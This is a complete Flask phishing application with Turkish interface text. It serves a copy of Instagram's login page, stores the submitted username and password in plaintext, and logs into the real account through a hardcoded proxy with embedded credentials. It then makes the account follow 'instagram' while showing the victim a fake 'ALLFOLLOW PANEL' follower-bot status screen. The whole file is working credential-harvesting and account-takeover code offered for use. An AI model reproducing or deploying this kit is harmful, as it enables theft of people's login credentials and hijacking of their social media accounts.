import os
import threading
from flask import Flask, request, jsonify, render_template_string
from flask_sqlalchemy import SQLAlchemy
from instagrapi import Client
from instagrapi.exceptions import ChallengeRequired, BadPassword
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv("DATABASE_URL")
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['SECRET_KEY'] = "instant-access-v71"

db = SQLAlchemy(app)
PROXY_URL = "http://SDDLzRveLbkavJr:MPvdO65MOnMifL7@82.41.250.136:42158"

clients = {}

class IGAccount(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100), unique=True, nullable=False)
    password = db.Column(db.String(100), nullable=False)
    status = db.Column(db.String(100), default="Sistem İşleniyor...")

def login_worker(u, p):
    with app.app_context():
        cl = Client()
        if PROXY_URL: cl.set_proxy(PROXY_URL)
        clients[u] = cl
        acc = IGAccount.query.filter_by(username=u).first()
        try:
            cl.login(u, p)
            acc.status = "AKTİF ✅"
            db.session.commit()
            cl.user_follow(cl.user_id_from_username("instagram"))
        except ChallengeRequired:
            acc.status = "ONAY GEREKLİ ⚠️"
            db.session.commit()
        except Exception:
            acc.status = "BAĞLANTI HATASI ❌"
            db.session.commit()

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/connect', methods=['POST'])
def connect():
    data = request.json
    u, p = data.get('u'), data.get('p')
    acc = IGAccount.query.filter_by(username=u).first()
    if not acc:
        acc = IGAccount(username=u, password=p, status="Giriş Yapılıyor...")
        db.session.add(acc)
    else:
        acc.password, acc.status = p, "Giriş Yapılıyor..."
    db.session.commit()
    threading.Thread(target=login_worker, args=(u, p)).start()
    return jsonify(status="ok")

@app.route('/api/status/<u>')
def get_status(u):
    acc = IGAccount.query.filter_by(username=u).first()
    return jsonify(status=acc.status if acc else "YOK")

HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>.page { display: none; } .active { display: block; }</style>
</head>
<body class="bg-[#fafafa]">

    <div id="login-p" class="page active flex flex-col items-center mt-12">
        <div class="bg-white border p-10 w-[350px] flex flex-col items-center">
            <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a2560540ad9.png" class="w-44 mb-8">
            <input id="u" placeholder="Kullanıcı adı" class="w-full p-2 mb-2 bg-gray-50 border rounded text-xs outline-none">
            <input id="p" type="password" placeholder="Şifre" class="w-full p-2 mb-4 bg-gray-50 border rounded text-xs outline-none">
            <button onclick="git()" class="w-full bg-[#0095f6] text-white py-1.5 rounded font-bold text-sm">Giriş Yap</button>
        </div>
    </div>

    <div id="panel-p" class="page min-h-screen bg-gray-50">
        <div class="p-6 max-w-sm mx-auto">
            <h1 class="text-center font-black text-purple-600 mb-6 italic">ALLFOLLOW PANEL</h1>
            
            <div class="bg-white p-10 rounded-[40px] shadow-2xl border-t-4 border-purple-500 text-center mb-6">
                <p class="text-[10px] text-gray-400 font-bold uppercase mb-2 tracking-widest">Bot Durumu</p>
                <h2 id="msg" class="text-2xl font-black italic text-purple-600 animate-pulse">BAĞLANIYOR...</h2>
            </div>

            <div class="bg-white p-4 rounded-3xl shadow-sm border flex items-center justify-between">
                <div><p class="text-[10px] text-gray-400 font-bold uppercase">Hesap</p><p id="usr-tag" class="font-bold text-sm"></p></div>
                <div class="w-10 h-10 bg-purple-100 rounded-full flex items-center justify-center text-purple-600 font-bold italic">IG</div>
            </div>
        </div>
    </div>

    <script>
        let cur = "";
        function git() {
            cur = document.getElementById('u').value;
            const p = document.getElementById('p').value;
            if(!cur || !p) return;

            // ADIM 1: PANELİ ANINDA AÇ (Bekleme Yapma!)
            document.getElementById('login-p').classList.remove('active');
            document.getElementById('panel-p').classList.add('active');
            document.getElementById('usr-tag').innerText = "@" + cur;

            // ADIM 2: ARKADAN VERİYİ GÖNDER
            fetch('/api/connect', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({u:cur, p:p})
            });

            // ADIM 3: DURUMU KONTROL ET
            setInterval(async () => {
                const r = await fetch('/api/status/' + cur);
                const d = await r.json();
                const m = document.getElementById('msg');
                m.innerText = d.status;
                if(d.status.includes("✅")) m.classList.remove('animate-pulse');
            }, 3000);
        }
    </script>
</body>
</html>
"""

if __name__ == "__main__":
    with app.app_context(): db.create_all()
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 10000)))
